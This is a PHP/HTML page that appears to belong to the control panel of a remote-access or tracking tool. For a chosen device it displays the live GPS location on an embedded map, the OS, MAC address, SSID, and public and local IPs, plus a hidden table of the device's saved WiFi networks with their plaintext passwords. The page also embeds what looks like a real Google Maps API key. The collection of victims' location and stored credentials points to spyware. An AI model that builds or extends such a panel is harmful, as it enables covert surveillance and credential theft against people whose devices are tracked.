<nav aria-label="breadcrumb">
    <ol class="breadcrumb">
    <li class="breadcrumb-item"><a href="./portal">Portal</a></li>
    <li class="breadcrumb-item"><a href="./pcpanel">PC Panel</a></li>
    <li class="breadcrumb-item active" aria-current="page">Device Info</li>
    </ol>
</nav>

<?php 

if ($_SESSION['device'] != $none):
    $device = $_SESSION['device'];

    $data = api_get_data();
    $mydevice;

    foreach ($data as $d){
        if ($d['id'] == $device){
            $mydevice = $d;
        }
    }

    $os = explode('|', $mydevice['os'])[0]

?>

<br>

<h4><b>Live Location</b></h4>
<iframe
    width="95%"
    height="320"
    frameborder="0" style="border:0"
    src="https://www.google.com/maps/embed/v1/place?q=<?=$mydevice['location']['lat']?>,<?=$mydevice['location']['long']?>&amp;key=AIzaSyBbBqsfDlYxBASUJAY9sAMj1Rag0BPKUDY"
    allowfullscreen>
</iframe>

<br>

<h4><b>Device Information</b></h4>
<p>Last update: <?=$mydevice['time']?></p>

<div class="list-group">
    <a class="list-group-item">OS : <b><?=$os?></b> </a>
    <a class="list-group-item">Nickname : <b><?=$mydevice['name']?></b> </a>
    <a class="list-group-item">Rath ID : <b><?=$mydevice['id']?></b></a>
</div>

<br>

<h4><b>Network Info</b></h4>
<div class="list-group">
    <a class="list-group-item">MAC : <b><?=$mydevice['wifi']['current_mac']?></b></a>
    <a class="list-group-item">WiFi : <b><?=$mydevice['wifi']['current_ssid']?></b></a>
    <a class="list-group-item">Public IP : <b><?=$mydevice['wifi']['current_public_ip']?></b></a>
    <a class="list-group-item">Local IP : <b><?=$mydevice['wifi']['current_local_ip']?></b></a>
</div>

<br>

<h4><b>Connected WiFi </b><button id="showbutton" class="btn btn-info" onclick="showWifi()">show</button></h4>
<table class="table" id="wifitable">
    <thead>
    <tr>
        <th scope="col">SSID</th>
        <th scope="col">Password</th>
    </tr>
    </thead>
    <tbody>

    <?php foreach($mydevice['wifi']['saved'] as $ssid => $pwd): ?>
        <tr>
            <td><?=$ssid?></td>
            <td><?=$pwd?></td>
        </tr>
    <?php endforeach; ?>
    </tbody>

<?php
else: 
    echo 'Please select a device.';
endif;
?>

<script>

var wifiTable = document.getElementById('wifitable');
wifiTable.style.display = "none";

var showButton = document.getElementById('showbutton');
var scrollPos = element.scrollTop;

function showWifi()
{
    if (wifiTable.style.display === "none"){
        wifiTable.style.display = "block";
        showButton.innerHTML = 'hide'
    } else {
        wifiTable.style.display = "none";
        showButton.innerHTML = 'show'
    }
}


</script>